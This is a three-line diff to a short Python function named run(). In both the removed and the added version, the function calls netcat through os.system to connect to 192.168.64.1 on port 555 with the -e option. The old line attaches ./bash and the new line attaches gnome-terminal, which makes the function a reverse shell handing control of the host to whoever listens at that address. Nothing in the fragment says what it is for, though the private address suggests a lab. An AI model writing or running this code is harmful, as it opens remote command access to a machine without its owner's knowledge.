@@ -1,3 +1,3 @@
 import os
 def run():
-    os.system('nc 192.168.64.1 555 -e ./bash')
+    os.system('nc 192.168.64.1 555 -e gnome-terminal')
